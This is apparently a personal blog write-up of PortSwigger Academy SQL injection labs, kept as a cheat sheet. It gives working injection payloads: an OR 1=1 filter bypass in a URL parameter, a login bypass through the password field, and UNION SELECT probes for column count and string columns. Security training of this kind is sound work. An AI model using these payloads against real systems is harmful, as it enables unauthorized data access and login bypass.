---
layout: post
title: Portswigger Academy - SQL Injection
date: 2023-06-06 15:43:18 +0200
categories: [Portswigger Academy, SQL Injection]
tags: [SQL Injection, Write-up, Cheat Sheet]
---

## Info

This is my write-up for the *SQL Injection* learning path at the Portswigger Academy.\
The reason for this write-up is to have a cheat-sheet or some go-to notes for myself.\
Probably I've found flags in a different way than intended (with or without the use of BurpSuite), and not always in the order of the hints.

[Portswigger Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)

## LAB : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This is an easy one. Just navigate to a category, and SQL Inject the GET query.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' OR 1=1--`

## LAB : SQL injection vulnerability allowing lobin bypass

This one can be done by passing a SQL Injection in the *password* field of the login form.

- Username: `administrator`
- Password: `' or 1=1--`

## LAB : SQL injection UNION attack, determining the number of columns returned by the query

This can also be done by injecting the SQL injection straight into the GET query of the URL.

First we need to check how many columns the original query returns, and match those.\
Start off with one *NULL* and keep adding until you don't get an error anymore.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`

Now we know we need to return 3 columns in our injection, we need to find a column that can contain a string.\
Again, start with trying the first column, and move further untill you don't get an error anymore.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'abc',NULL--`


